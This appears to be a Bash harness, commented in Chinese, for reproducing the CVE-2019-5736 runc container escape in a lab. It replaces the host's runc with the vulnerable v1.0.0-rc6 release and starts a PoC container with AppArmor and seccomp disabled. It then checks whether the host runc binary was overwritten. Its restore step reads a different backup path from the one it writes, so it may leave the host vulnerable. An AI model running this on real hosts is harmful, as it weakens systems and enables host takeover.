#!/bin/bash
set -e

# # 配置文件路径
VULN_RUNC_URL="https://github.com/opencontainers/runc/releases/download/v1.0.0-rc6/runc.amd64"
LOCAL_RUNC_BACKUP="/usr/bin/runc.bak"
# 优先寻找你下载好的文件名
PRE_DOWNLOADED="./runc.amd64"
DOWNLOADED_RUNC="./runc_vuln_bin"
PROOF_FILE="/tmp/CVE-2019-5736-PWNED"

# echo "=================================================="
# echo "      CVE-2019-5736 环境检测与自动化复现脚本"
# echo "=================================================="

# # 1. 权限检查
# if [ "$EUID" -ne 0 ]; then
#     echo "[-] 错误：操作系统文件需要 root 权限，请使用 sudo 运行此脚本。"
#     exit 1
# fi

# # 2. 版本检测逻辑
# check_vulnerability() {
#     RUNC_VERSION=$(runc --version | head -n1 | awk '{print $NF}')
#     echo "[+] 当前系统使用中的 runc 版本: $RUNC_VERSION"
    
#     # 检测是否已经是受影响版本 (1.0-rc6)
#     if [[ "$RUNC_VERSION" == "1.0.0-rc6" ]]; then
#         return 0 # 已是漏洞版本
#     fi
#     return 1 # 可能是修复版本
# }

# # 3. 环境准备阶段
# if ! check_vulnerability; then
#     echo "[!] 警告：当前系统 runc 版本高于 rc6，可能已修复该漏洞。"
#     read -p "[?] 是否应用本地漏洞版 runc 并临时替换系统文件？(y/N): " setup_choice
#     if [[ "$setup_choice" =~ ^[Yy]$ ]]; then
#         # 备份原版
#         if [ ! -f "$LOCAL_RUNC_BACKUP" ]; then
#             echo "[*] 正在备份原版 runc 至 $LOCAL_RUNC_BACKUP ..."
#             cp /usr/bin/runc "$LOCAL_RUNC_BACKUP"
#         fi
        
#         # 处理本地文件逻辑
#         if [ -f "$PRE_DOWNLOADED" ]; then
#             echo "[+] 发现本地文件 $PRE_DOWNLOADED，正在准备..."
#             cp "$PRE_DOWNLOADED" "$DOWNLOADED_RUNC"
#         elif [ ! -f "$DOWNLOADED_RUNC" ]; then
#             echo "[*] 未发现本地文件，尝试从网络下载..."
#             wget -O "$DOWNLOADED_RUNC" "$VULN_RUNC_URL" || { echo "[-] 下载失败，请手动将 runc.amd64 放入目录"; exit 1; }
#         fi
        
#         chmod +x "$DOWNLOADED_RUNC"
#         echo "[*] 正在替换系统 /usr/bin/runc ..."
#         cp "$DOWNLOADED_RUNC" /usr/bin/runc
#         sudo systemctl restart docker
#         echo "[+] runc 替换成功: $(runc --version | head -n1)"
#     else
#         echo "[*] 用户取消操作，退出脚本。"
#         exit 0
#     fi
# else
#     echo "[+] 检测到当前系统已处于受影响版本，直接开始复现。"
# fi

check_and_fix_runc() {
    RUNC_PATH=$(which runc)
    [ -z "$RUNC_PATH" ] && RUNC_PATH="/usr/sbin/runc"
    
    CURRENT_VER=$(runc --version | head -n1 | awk '{print $NF}')
    echo "[+] 当前 runc 路径: $RUNC_PATH 版本: $CURRENT_VER"

    if [[ "$CURRENT_VER" != "1.0.0-rc6" ]]; then
        read -p "[?] 当前版本不符，是否下载并替换为 v1.0.0-rc6? [y/N]: " yn
        if [[ "$yn" =~ ^[Yy]$ ]]; then
            echo "[*] 正在下载并备份原 runc..."
            sudo wget -q --show-progress https://github.com/opencontainers/runc/releases/download/v1.0.0-rc6/runc.amd64 -O /tmp/runc_rc92
            if [ $? -ne 0 ]; then
                echo "[!] 下载失败，请检查网络或手动下载 runc.amd64 到 /tmp/runc_rc92"; exit 1
            fi
            sudo mv "$RUNC_PATH" "${RUNC_PATH}.bak" 2>/dev/null
            sudo cp /tmp/runc_rc92 "$RUNC_PATH"
            sudo chmod +x "$RUNC_PATH"
            # 兼容 Ubuntu 路径
            [ -f /usr/bin/runc ] && sudo cp "$RUNC_PATH" /usr/bin/runc
            sudo systemctl restart docker
            echo "[+] runc 替换成功: $(runc --version | head -n1)"
        fi
    fi
}

check_and_fix_runc


# 4. 漏洞复现阶段
echo -e "\n[*] 正在启动 Docker 复现流程..."
docker rm -f cve_2019_5736_poc 2>/dev/null || true

echo "[*] 构建 PoC 镜像..."
docker build -t cve-2019-5736-poc . 

echo "[*] 启动恶意容器..."
docker run -d --name cve_2019_5736_poc --security-opt apparmor=unconfined --security-opt seccomp=unconfined cve-2019-5736-poc

echo "[*] 等待 exploit 运行 (5s)..."
sleep 5

# 检查日志确认覆盖动作
if docker logs cve_2019_5736_poc 2>&1 | grep -q "Successfully overwritten runc binary"; then 
    echo "[+] 容器已成功修改了宿主机的 runc 二进制文件！"
    echo -e "\n[!!!] 关键触发动作：请手动执行以下命令："
    echo "      docker run --rm hello-world"
    echo ""
    read -p "[*] 执行完毕后按回车验证复现结果... " _
    
    if [ -f "$PROOF_FILE" ]; then
        echo -e "\n[+ SUCCESS] 宿主机已被 PWNED！"
        echo "    生成文件内容: $(cat $PROOF_FILE)" 
    else
        echo -e "\n[-] 未发现 Proof 文件，复现未成功。"
    fi
else
    echo "[-] 容器未能成功修改 runc，查看日志排查："
    docker logs cve_2019_5736_poc 
fi

# 5. 清理阶段
echo -e "\n=================================================="
read -p "[?] 复现结束，是否还原系统 runc 环境？(y/N): " clean_choice
if [[ "$clean_choice" =~ ^[Yy]$ ]]; then
    if [ -f "$LOCAL_RUNC_BACKUP" ]; then
        echo "[*] 正在恢复原始 runc 并重启服务..."
        mv "$LOCAL_RUNC_BACKUP" /usr/bin/runc
        systemctl restart docker
        echo "[+] 环境已还原。"
    fi
    rm -f "$PROOF_FILE" 2>/dev/null
    docker rm -f cve_2019_5736_poc 2>/dev/null || true
else
    echo "[!] 警示：系统目前仍运行漏洞版 runc，请后续务必手动恢复！"
fi